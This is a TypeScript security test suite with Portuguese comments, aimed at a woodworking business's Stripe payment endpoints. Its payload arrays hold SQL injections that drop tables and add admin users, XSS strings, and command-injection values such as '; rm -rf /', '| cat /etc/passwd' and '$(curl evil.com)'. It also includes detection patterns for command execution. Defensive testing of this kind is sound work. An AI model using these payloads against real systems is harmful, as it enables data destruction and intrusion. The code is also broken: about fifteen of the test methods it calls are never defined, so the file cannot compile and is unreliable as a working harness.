/**
 * Bateria de Testes de Segurança MCP - Integração Stripe
 * JP Marcenaria Digital
 * 
 * Metodologia de Controle de Proteção (MCP) para avaliação sistemática
 * de vulnerabilidades no sistema de pagamento integrado com Stripe
 */

import { describe, test, expect, beforeEach, afterEach } from '@jest/globals';
import { JSDOM } from 'jsdom';
import fetch from 'node-fetch';

// Configurações de teste
const TEST_CONFIG = {
  STRIPE_API_VERSION: '2023-10-16',
  BASE_URL: process.env.TEST_BASE_URL || 'http://localhost:3000',
  STRIPE_PUBLISHABLE_KEY: process.env.STRIPE_PUBLISHABLE_KEY_TEST,
  STRIPE_SECRET_KEY: process.env.STRIPE_SECRET_KEY_TEST,
  WEBHOOK_SECRET: process.env.STRIPE_WEBHOOK_SECRET_TEST,
  TLS_MIN_VERSION: 'TLSv1.2'
};

// Interfaces para tipagem
interface SecurityTestResult {
  testName: string;
  status: 'PASS' | 'FAIL' | 'WARNING';
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  cvssScore?: number;
  description: string;
  evidence?: string[];
  recommendation: string;
  cweId?: string;
}

interface StripeEndpoint {
  url: string;
  method: string;
  requiresAuth: boolean;
  sensitive: boolean;
}

// Classe principal para testes de segurança
export class StripeSecurityTester {
  private results: SecurityTestResult[] = [];
  private endpoints: StripeEndpoint[] = [
    { url: '/api/stripe/create-payment-intent', method: 'POST', requiresAuth: true, sensitive: true },
    { url: '/api/stripe/confirm-payment', method: 'POST', requiresAuth: true, sensitive: true },
    { url: '/api/stripe/create-subscription', method: 'POST', requiresAuth: true, sensitive: true },
    { url: '/api/stripe/cancel-subscription', method: 'POST', requiresAuth: true, sensitive: true },
    { url: '/api/stripe/webhook', method: 'POST', requiresAuth: false, sensitive: true },
    { url: '/api/stripe/refund', method: 'POST', requiresAuth: true, sensitive: true },
    { url: '/api/stripe/customer', method: 'GET', requiresAuth: true, sensitive: true }
  ];

  /**
   * 1. ANÁLISE DA INTEGRAÇÃO COM API STRIPE
   */
  async analyzeStripeIntegration(): Promise<void> {
    console.log('🔍 Iniciando análise da integração Stripe...');

    // Verificar versão da API
    await this.checkApiVersion();
    
    // Verificar endpoints
    await this.validateEndpoints();
    
    // Verificar mecanismos de fallback
    await this.testFallbackMechanisms();
    
    // Verificar tratamento de erros
    await this.testErrorHandling();
  }

  private async checkApiVersion(): Promise<void> {
    try {
      const response = await fetch(`${TEST_CONFIG.BASE_URL}/api/stripe/version`);
      const data = await response.json() as any;
      
      if (data.version !== TEST_CONFIG.STRIPE_API_VERSION) {
        this.addResult({
          testName: 'API Version Check',
          status: 'WARNING',
          severity: 'MEDIUM',
          cvssScore: 5.3,
          description: `Versão da API Stripe desatualizada: ${data.version}`,
          recommendation: `Atualizar para versão ${TEST_CONFIG.STRIPE_API_VERSION}`,
          cweId: 'CWE-1104'
        });
      } else {
        this.addResult({
          testName: 'API Version Check',
          status: 'PASS',
          severity: 'LOW',
          description: 'Versão da API Stripe está atualizada',
          recommendation: 'Manter monitoramento de novas versões'
        });
      }
    } catch (error) {
      this.addResult({
        testName: 'API Version Check',
        status: 'FAIL',
        severity: 'HIGH',
        cvssScore: 7.5,
        description: 'Falha ao verificar versão da API Stripe',
        evidence: [error instanceof Error ? error.message : String(error)],
        recommendation: 'Implementar endpoint de verificação de versão',
        cweId: 'CWE-200'
      });
    }
  }

  private async validateEndpoints(): Promise<void> {
    for (const endpoint of this.endpoints) {
      try {
        const response = await fetch(`${TEST_CONFIG.BASE_URL}${endpoint.url}`, {
          method: endpoint.method,
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'SecurityTest/1.0'
          }
        });

        // Verificar se endpoint existe
        if (response.status === 404) {
          this.addResult({
            testName: `Endpoint Validation - ${endpoint.url}`,
            status: 'FAIL',
            severity: 'HIGH',
            cvssScore: 7.0,
            description: `Endpoint não encontrado: ${endpoint.url}`,
            recommendation: 'Implementar endpoint ou remover da documentação',
            cweId: 'CWE-200'
          });
        }

        // Verificar headers de segurança
        await this.checkSecurityHeaders(response, endpoint);

      } catch (error) {
        this.addResult({
          testName: `Endpoint Validation - ${endpoint.url}`,
          status: 'FAIL',
          severity: 'CRITICAL',
          cvssScore: 9.0,
          description: `Erro ao acessar endpoint: ${endpoint.url}`,
          evidence: [error instanceof Error ? error.message : String(error)],
          recommendation: 'Verificar disponibilidade e configuração do endpoint',
          cweId: 'CWE-200'
        });
      }
    }
  }

  /**
   * 2. TESTES DE INJEÇÃO
   */
  async performInjectionTests(): Promise<void> {
    console.log('💉 Executando testes de injeção...');

    await this.testSQLInjection();
    await this.testXSSInjection();
    await this.testCommandInjection();
    await this.testParameterManipulation();
  }

  private async testSQLInjection(): Promise<void> {
    const sqlPayloads = [
      "'; DROP TABLE payments; --",
      "' OR '1'='1",
      "'; SELECT * FROM users WHERE '1'='1'; --",
      "' UNION SELECT creditCardNumber FROM payments --",
      "'; INSERT INTO admin_users VALUES ('hacker', 'password'); --"
    ];

    for (const payload of sqlPayloads) {
      for (const endpoint of this.endpoints.filter(e => e.sensitive)) {
        try {
          const testData = {
            amount: payload,
            currency: payload,
            customer_id: payload,
            payment_method: payload
          };

          const response = await fetch(`${TEST_CONFIG.BASE_URL}${endpoint.url}`, {
            method: endpoint.method,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(testData)
          });

          const responseText = await response.text();

          // Verificar se há vazamento de informações do banco
          if (this.detectSQLError(responseText)) {
            this.addResult({
              testName: `SQL Injection - ${endpoint.url}`,
              status: 'FAIL',
              severity: 'CRITICAL',
              cvssScore: 9.8,
              description: 'Possível vulnerabilidade de SQL Injection detectada',
              evidence: [payload, responseText.substring(0, 500)],
              recommendation: 'Implementar prepared statements e validação de entrada',
              cweId: 'CWE-89'
            });
          }
        } catch (error) {
          // Erro esperado - boa prática
        }
      }
    }
  }

  private async testXSSInjection(): Promise<void> {
    const xssPayloads = [
      "<script>alert('XSS')</script>",
      "javascript:alert('XSS')",
      "<img src=x onerror=alert('XSS')>",
      "';alert('XSS');//",
      "<svg onload=alert('XSS')>"
    ];

    for (const payload of xssPayloads) {
      // Testar em campos de formulário de pagamento
      const testFields = ['customer_name', 'billing_address', 'description'];
      
      for (const field of testFields) {
        const testData = { [field]: payload };
        
        try {
          const response = await fetch(`${TEST_CONFIG.BASE_URL}/api/stripe/create-payment-intent`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(testData)
          });

          const responseText = await response.text();

          // Verificar se o payload é refletido sem sanitização
          if (responseText.includes(payload)) {
            this.addResult({
              testName: `XSS Injection - ${field}`,
              status: 'FAIL',
              severity: 'HIGH',
              cvssScore: 8.2,
              description: `Possível vulnerabilidade XSS no campo ${field}`,
              evidence: [payload, responseText.substring(0, 300)],
              recommendation: 'Implementar sanitização e encoding de saída',
              cweId: 'CWE-79'
            });
          }
        } catch (error) {
          // Erro esperado
        }
      }
    }
  }

  private async testCommandInjection(): Promise<void> {
    const commandPayloads = [
      "; ls -la",
      "| cat /etc/passwd",
      "&& whoami",
      "; rm -rf /",
      "$(curl evil.com)"
    ];

    for (const payload of commandPayloads) {
      try {
        const response = await fetch(`${TEST_CONFIG.BASE_URL}/api/stripe/webhook`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            type: 'payment_intent.succeeded',
            data: { object: { metadata: { command: payload } } }
          })
        });

        const responseText = await response.text();
        
        // Verificar sinais de execução de comando
        if (this.detectCommandExecution(responseText)) {
          this.addResult({
            testName: 'Command Injection - Webhook',
            status: 'FAIL',
            severity: 'CRITICAL',
            cvssScore: 9.9,
            description: 'Vulnerabilidade de injeção de comando detectada',
            evidence: [payload, responseText],
            recommendation: 'Validar e sanitizar todos os inputs, usar whitelist',
            cweId: 'CWE-78'
          });
        }
      } catch (error) {
        // Erro esperado
      }
    }
  }

  /**
   * 3. AUDITORIA DE AUTENTICAÇÃO E AUTORIZAÇÃO
   */
  async auditAuthenticationAuthorization(): Promise<void> {
    console.log('🔐 Auditando autenticação e autorização...');

    await this.validateJWTTokens();
    await this.testRoleBasedAccess();
    await this.testPrivilegeEscalation();
    await this.testSessionManagement();
  }

  private async validateJWTTokens(): Promise<void> {
    const invalidTokens = [
      'invalid.jwt.token',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid',
      '', // Token vazio
      'Bearer malformed-token',
      'null'
    ];

    for (const token of invalidTokens) {
      try {
        const response = await fetch(`${TEST_CONFIG.BASE_URL}/api/stripe/customer`, {
          headers: { 'Authorization': `Bearer ${token}` }
        });

        if (response.status !== 401 && response.status !== 403) {
          this.addResult({
            testName: 'JWT Token Validation',
            status: 'FAIL',
            severity: 'HIGH',
            cvssScore: 8.5,
            description: 'Token JWT inválido aceito pelo sistema',
            evidence: [token, `Status: ${response.status}`],
            recommendation: 'Implementar validação rigorosa de tokens JWT',
            cweId: 'CWE-287'
          });
        }
      } catch (error) {
        // Erro esperado para tokens inválidos
      }
    }
  }

  /**
   * 4. AVALIAÇÃO DE DADOS SENSÍVEIS
   */
  async evaluateSensitiveDataHandling(): Promise<void> {
    console.log('🔒 Avaliando tratamento de dados sensíveis...');

    await this.checkTLSConfiguration();
    await this.testCredentialStorage();
    await this.checkLogSecurity();
    await this.validateDataMasking();
  }

  private async checkTLSConfiguration(): Promise<void> {
    try {
      // Verificar se HTTPS é obrigatório
      const httpResponse = await fetch(TEST_CONFIG.BASE_URL.replace('https://', 'http://'));
      
      if (httpResponse.status !== 301 && httpResponse.status !== 302) {
        this.addResult({
          testName: 'TLS Configuration',
          status: 'FAIL',
          severity: 'CRITICAL',
          cvssScore: 9.1,
          description: 'Conexões HTTP não são redirecionadas para HTTPS',
          recommendation: 'Forçar redirecionamento HTTPS e implementar HSTS',
          cweId: 'CWE-319'
        });
      }

      // Verificar headers de segurança TLS
      const httpsResponse = await fetch(TEST_CONFIG.BASE_URL);
      const hstsHeader = httpsResponse.headers.get('strict-transport-security');
      
      if (!hstsHeader) {
        this.addResult({
          testName: 'HSTS Header',
          status: 'FAIL',
          severity: 'MEDIUM',
          cvssScore: 6.1,
          description: 'Header HSTS não configurado',
          recommendation: 'Implementar header Strict-Transport-Security',
          cweId: 'CWE-319'
        });
      }
    } catch (error) {
      this.addResult({
        testName: 'TLS Configuration',
        status: 'FAIL',
        severity: 'CRITICAL',
        cvssScore: 9.0,
        description: 'Falha ao verificar configuração TLS',
        evidence: [error instanceof Error ? error.message : String(error)],
        recommendation: 'Verificar configuração SSL/TLS do servidor',
        cweId: 'CWE-319'
      });
    }
  }

  /**
   * 5. TESTES DE MANIPULAÇÃO DE REQUISIÇÕES
   */
  async testRequestResponseManipulation(): Promise<void> {
    console.log('🔄 Testando manipulação de requisições e respostas...');

    await this.testCSRFProtection();
    await this.testCallbackManipulation();
    await this.testJSONManipulation();
    await this.testTimingAttacks();
  }

  private async testCSRFProtection(): Promise<void> {
    try {
      // Tentar fazer requisição sem token CSRF
      const response = await fetch(`${TEST_CONFIG.BASE_URL}/api/stripe/create-payment-intent`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ amount: 1000, currency: 'brl' })
      });

      // Verificar se há proteção CSRF
      const csrfHeader = response.headers.get('x-csrf-token');
      if (!csrfHeader && response.status === 200) {
        this.addResult({
          testName: 'CSRF Protection',
          status: 'FAIL',
          severity: 'HIGH',
          cvssScore: 8.1,
          description: 'Proteção CSRF não implementada',
          recommendation: 'Implementar tokens CSRF para todas as operações sensíveis',
          cweId: 'CWE-352'
        });
      }
    } catch (error) {
      // Erro esperado se proteção estiver ativa
    }
  }

  /**
   * 6. TESTES ESPECÍFICOS STRIPE
   */
  async testStripeSpecificSecurity(): Promise<void> {
    console.log('💳 Testando segurança específica do Stripe...');

    await this.testPCIDSSCompliance();
    await this.testTokenLifecycle();
    await this.testWebhookSecurity();
    await this.testRefundSecurity();
  }

  private async testPCIDSSCompliance(): Promise<void> {
    // Verificar se dados de cartão são processados localmente
    const cardData = {
      number: '4242424242424242',
      exp_month: 12,
      exp_year: 2025,
      cvc: '123'
    };

    try {
      const response = await fetch(`${TEST_CONFIG.BASE_URL}/api/stripe/process-card`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(cardData)
      });

      if (response.status === 200) {
        this.addResult({
          testName: 'PCI DSS Compliance',
          status: 'FAIL',
          severity: 'CRITICAL',
          cvssScore: 10.0,
          description: 'Dados de cartão sendo processados diretamente no servidor',
          recommendation: 'Usar Stripe Elements ou Payment Intents para processar cartões',
          cweId: 'CWE-359'
        });
      }
    } catch (error) {
      // Esperado - não deve processar cartões diretamente
    }
  }

  private async testWebhookSecurity(): Promise<void> {
    // Testar webhook sem assinatura válida
    const fakeWebhook = {
      id: 'evt_fake',
      type: 'payment_intent.succeeded',
      data: {
        object: {
          id: 'pi_fake',
          amount: 999999,
          status: 'succeeded'
        }
      }
    };

    try {
      const response = await fetch(`${TEST_CONFIG.BASE_URL}/api/stripe/webhook`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'stripe-signature': 'fake_signature'
        },
        body: JSON.stringify(fakeWebhook)
      });

      if (response.status === 200) {
        this.addResult({
          testName: 'Webhook Security',
          status: 'FAIL',
          severity: 'CRITICAL',
          cvssScore: 9.5,
          description: 'Webhook aceita requisições sem assinatura válida',
          recommendation: 'Implementar verificação de assinatura Stripe',
          cweId: 'CWE-345'
        });
      }
    } catch (error) {
      // Esperado - webhook deve rejeitar assinaturas inválidas
    }
  }

  // Métodos auxiliares
  private detectSQLError(response: string): boolean {
    const sqlErrors = [
      'SQL syntax error',
      'mysql_fetch_array',
      'ORA-',
      'PostgreSQL query failed',
      'sqlite3.OperationalError'
    ];
    return sqlErrors.some(error => response.toLowerCase().includes(error.toLowerCase()));
  }

  private detectCommandExecution(response: string): boolean {
    const commandIndicators = [
      'uid=',
      'gid=',
      'root:',
      '/bin/',
      'command not found'
    ];
    return commandIndicators.some(indicator => response.includes(indicator));
  }

  private checkSecurityHeaders(response: Response, endpoint: StripeEndpoint): void {
    const requiredHeaders = [
      'x-content-type-options',
      'x-frame-options',
      'x-xss-protection',
      'content-security-policy'
    ];

    for (const header of requiredHeaders) {
      if (!response.headers.get(header)) {
        this.addResult({
          testName: `Security Headers - ${endpoint.url}`,
          status: 'WARNING',
          severity: 'MEDIUM',
          cvssScore: 5.0,
          description: `Header de segurança ausente: ${header}`,
          recommendation: `Implementar header ${header}`,
          cweId: 'CWE-693'
        });
      }
    }
  }

  private addResult(result: SecurityTestResult): void {
    this.results.push(result);
  }

  // Método para executar todos os testes
  async runAllTests(): Promise<SecurityTestResult[]> {
    console.log('🚀 Iniciando bateria completa de testes de segurança MCP...\n');

    try {
      await this.analyzeStripeIntegration();
      await this.performInjectionTests();
      await this.auditAuthenticationAuthorization();
      await this.evaluateSensitiveDataHandling();
      await this.testRequestResponseManipulation();
      await this.testStripeSpecificSecurity();
    } catch (error) {
      console.error('Erro durante execução dos testes:', error);
    }

    return this.results;
  }

  // Gerar relatório de segurança
  generateSecurityReport(): string {
    const critical = this.results.filter(r => r.severity === 'CRITICAL').length;
    const high = this.results.filter(r => r.severity === 'HIGH').length;
    const medium = this.results.filter(r => r.severity === 'MEDIUM').length;
    const low = this.results.filter(r => r.severity === 'LOW').length;

    return `
# RELATÓRIO DE SEGURANÇA - INTEGRAÇÃO STRIPE
## JP Marcenaria Digital

### RESUMO EXECUTIVO
- **Vulnerabilidades Críticas:** ${critical}
- **Vulnerabilidades Altas:** ${high}
- **Vulnerabilidades Médias:** ${medium}
- **Vulnerabilidades Baixas:** ${low}
- **Total de Testes:** ${this.results.length}

### CLASSIFICAÇÃO DE RISCO
${this.results.map(r => `
**${r.testName}**
- Status: ${r.status}
- Severidade: ${r.severity}
- CVSS: ${r.cvssScore || 'N/A'}
- CWE: ${r.cweId || 'N/A'}
- Descrição: ${r.description}
- Recomendação: ${r.recommendation}
${r.evidence ? `- Evidências: ${r.evidence.join(', ')}` : ''}
`).join('\n')}

### PRÓXIMOS PASSOS
1. Corrigir vulnerabilidades críticas imediatamente
2. Implementar correções para vulnerabilidades altas em 7 dias
3. Planejar correções para vulnerabilidades médias em 30 dias
4. Estabelecer testes contínuos de segurança
`;
  }
}

// Exportar para uso em testes
export default StripeSecurityTester;